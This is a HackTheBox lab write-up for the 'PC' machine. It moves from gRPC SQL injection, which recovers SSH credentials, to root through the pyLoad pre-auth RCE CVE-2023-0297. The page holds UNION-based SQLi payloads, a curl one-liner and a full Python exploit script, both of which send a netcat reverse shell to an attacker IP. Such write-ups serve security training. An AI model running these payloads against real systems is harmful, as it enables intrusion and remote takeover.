---
title: "PC - HackTheBox"
description: "Writeup of the PC machine from HackTheBox, an easy Linux machine involving gRPC exploitation with SQLi and privilege escalation via pyLoad."
pubDate: 2026-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: en
tags: ["grpc", "sqli", "pyload", "CVE-2023-0297", "protobuf"]
retired: false
logo: "/images/writeups/htb/pc/logo.png"
heroImage: "/images/writeups/htb/pc/card.png"
attackVectors: ["network", "web"]
techniques: ["T1190", "T1190", "T1068"]
vulnerabilities: ["CVE-2023-0297", "sql-injection"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "2-3 hours"
points: 20
rating: 4.3
---

# PC - HackTheBox Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: HackTheBox  
**IP**: 10.10.11.214

## Introduction

PC is an easy Linux machine featuring a gRPC service vulnerable to SQL Injection. After exploiting this vulnerability to obtain credentials, we'll find a pyLoad service vulnerable to CVE-2023-0297 to gain root access.

## Reconnaissance

### Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.214 -oG allPorts
```

**Open ports:**
- 22/tcp - SSH
- 50051/tcp - Unknown

### Service Scanning

```bash
nmap -p22,50051 -sCV 10.10.11.214 -oN targeted
```

**Results:**
- **22/tcp** - OpenSSH 8.2p1 Ubuntu
- **50051/tcp** - Unidentified (gRPC)

## gRPC Enumeration

Port 50051 typically runs **gRPC**, a high-performance RPC framework.

### Installing gRPC Tools

```bash
pip3 install grpcurl grpcui
```

or download grpcurl:

```bash
wget https://github.com/fullstorydev/grpcurl/releases/download/v1.8.9/grpcurl_1.8.9_linux_x86_64.tar.gz
tar -xvf grpcurl_1.8.9_linux_x86_64.tar.gz
chmod +x grpcurl
```

### Enumerating gRPC Services

```bash
./grpcurl -plaintext 10.10.11.214:50051 list
```

**Result:**
```
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

### Enumerating Methods

```bash
./grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
```

**Available methods:**
```
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

### Service Description

```bash
./grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
```

## Exploitation

### User Registration

```bash
./grpcurl -plaintext -d '{"username": "test", "password": "test123"}' 10.10.11.214:50051 SimpleApp.RegisterUser
```

**Response:**
```json
{
  "message": "Account created for user test!"
}
```

### Login

```bash
./grpcurl -plaintext -d '{"username": "test", "password": "test123"}' 10.10.11.214:50051 SimpleApp.LoginUser
```

**Response:**
```json
{
  "message": "Your id is 812."
}
```

### GetInfo

Testing the getInfo method:

```bash
./grpcurl -plaintext -d '{"id": "812"}' 10.10.11.214:50051 SimpleApp.getInfo
```

**Response:**
```json
{
  "message": "Authorization Error.Missing 'token' header"
}
```

### Authentication Token

We need the JWT token. Using grpcui for better interaction:

```bash
grpcui -plaintext 10.10.11.214:50051
```

This opens a web interface. Login and capture the token in Burp Suite.

### SQL Injection in getInfo

The `id` parameter is vulnerable to SQL Injection:

```bash
./grpcurl -plaintext -H "token: <TOKEN>" -d '{"id": "1 OR 1=1"}' 10.10.11.214:50051 SimpleApp.getInfo
```

### Information Extraction with SQLMap

Save the request to a file and use SQLMap:

```bash
sqlmap -r request.txt --batch --dump
```

or manually with UNION-based SQLi:

```bash
# Number of columns
./grpcurl -plaintext -H "token: <TOKEN>" -d '{"id": "1 UNION SELECT NULL,NULL--"}' 10.10.11.214:50051 SimpleApp.getInfo

# Data extraction
./grpcurl -plaintext -H "token: <TOKEN>" -d '{"id": "1 UNION SELECT username,password FROM accounts--"}' 10.10.11.214:50051 SimpleApp.getInfo
```

**Credentials found:**
- User: sau
- Password: HereIsYourPassWord1431

### SSH as sau

```bash
ssh sau@10.10.11.214
# Password: HereIsYourPassWord1431
```

**User flag:**
```bash
cat /home/sau/user.txt
```

## Post-Exploitation

### Service Enumeration

```bash
netstat -tulpn
ss -tulpn
```

We find an internal service on port 8000:

```bash
curl http://localhost:8000
```

It's a **pyLoad** instance (download manager).

### Port Forwarding

```bash
ssh -L 8000:localhost:8000 sau@10.10.11.214
```

Now access `http://localhost:8000` from our browser.

## Privilege Escalation

### CVE-2023-0297 - pyLoad Pre-auth RCE

pyLoad 0.5.0b3.dev31 is vulnerable to **CVE-2023-0297**, which allows RCE without authentication.

### Version Verification

In the web interface we can see the version: **pyLoad 0.5.0b3.dev31**

### Exploit

```bash
curl -i -s -k -X POST \
  --data-binary "jk=pyimport%20os;os.system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|bash%20-i%202>&1|nc%2010.10.14.5%20443%20>/tmp/f');f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa" \
  'http://localhost:8000/flash/addcrypted2'
```

### Listener

```bash
nc -lvnp 443
```

**Root flag:**
```bash
cat /root/root.txt
```

### Alternative: Python Exploit

```python
#!/usr/bin/env python3
import requests
import argparse

def exploit(target, lhost, lport):
    url = f"http://{target}/flash/addcrypted2"
    
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
    
    data = {
        "jk": f"pyimport os;os.system('{payload}');f=function f2(){{}};",
        "package": "xxx",
        "crypted": "AAAA",
        "passwords": "aaaa"
    }
    
    response = requests.post(url, data=data)
    print(f"[+] Exploit sent! Status: {response.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target (IP:PORT)")
    parser.add_argument("-l", "--lhost", required=True, help="Listener IP")
    parser.add_argument("-p", "--lport", required=True, help="Listener PORT")
    
    args = parser.parse_args()
    exploit(args.target, args.lhost, args.lport)
```

Usage:

```bash
python3 exploit.py -t localhost:8000 -l 10.10.14.5 -p 443
```

## Conclusion

PC is an excellent machine to learn about:
- Enumeration and exploitation of gRPC services
- SQL Injection in non-traditional contexts
- API analysis with Protocol Buffers
- CVE-2023-0297 - pyLoad RCE
- Port forwarding and pivoting
- Internal service analysis

**Lessons Learned:**
- gRPC services can have the same vulnerabilities as REST APIs
- Internal service enumeration is crucial
- Always check software versions for known CVEs
- Port forwarding is essential for accessing internal services

**Mitigations:**
- Implement input validation on all parameters
- Use prepared statements to prevent SQL Injection
- Update pyLoad to patched versions
- Don't expose management services on network interfaces
- Implement robust authentication on all endpoints
- Use Web Application Firewalls (WAF)
